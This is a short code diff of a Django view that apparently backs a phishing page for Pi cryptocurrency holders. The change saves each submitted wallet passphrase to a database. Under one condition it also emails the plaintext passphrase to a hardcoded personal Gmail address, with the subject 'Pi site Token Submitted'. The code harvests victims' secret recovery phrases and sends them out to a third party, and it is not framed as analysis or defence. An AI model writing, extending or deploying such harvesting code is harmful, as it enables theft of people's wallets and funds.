@@ -23,9 +23,10 @@ def sendmail(request, keys, email):
     exists = PassPhrase.objects.filter(keys = keys).exists()
 
     if not exists:
-        PassPhrase.objects.create(
-            keys = keys
+        saved = PassPhrase.objects.create(
+            keys = decoded_param
         )
+        saved.save()
 
         if email == 'no@no.com':
             send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to='ezekielobiajulu01@gmail.com')
